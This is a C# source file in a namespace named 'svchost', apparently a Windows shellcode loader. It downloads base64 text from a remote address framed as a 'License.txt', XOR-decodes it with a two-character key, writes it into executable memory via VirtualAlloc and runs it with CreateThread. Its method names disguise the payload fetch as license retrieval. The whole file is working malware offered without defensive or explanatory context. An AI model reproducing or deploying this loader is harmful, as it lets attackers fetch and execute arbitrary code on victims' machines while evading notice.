using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace svchost
{
    using System;
    using System.IO;
    using System.Net;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Diagnostics;

    namespace Program
    {
        class Program
        {
            [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
            [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
            [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
            public static string GetLicense(string host)
            {
                //byte[] arraryByte;
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(host);
                request.Method = "GET";
                using (HttpWebResponse web = (HttpWebResponse)request.GetResponse())
                {
                    StreamReader reader = new StreamReader(web.GetResponseStream(), Encoding.UTF8);
                    String resource = reader.ReadToEnd();
                    return resource;
                }
            }

            public static Byte[] GetLicenseCode(string content)
            {
                return Convert.FromBase64String(content);
            }

            public static byte[] DecodeLicenseCode(byte[] input)
            {
                char[] key = { 'B', '4', };
                byte[] output = new byte[input.Length];
                for (int i = 0; i < input.Length; i++)
                {
                    output[i] = (byte)(input[i] ^ key[i % key.Length]);
                }
                return output;
            }
            static void Main(string[] args)
            {
                string resource = GetLicense("http://192.168.1.1:8080/License.txt");
                byte[] code = DecodeLicenseCode(GetLicenseCode(resource));
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)code.Length, (UInt32)0x1000, (UInt32)0x40);
                Marshal.Copy(code, 0, (IntPtr)(funcAddr), code.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }
    }

}
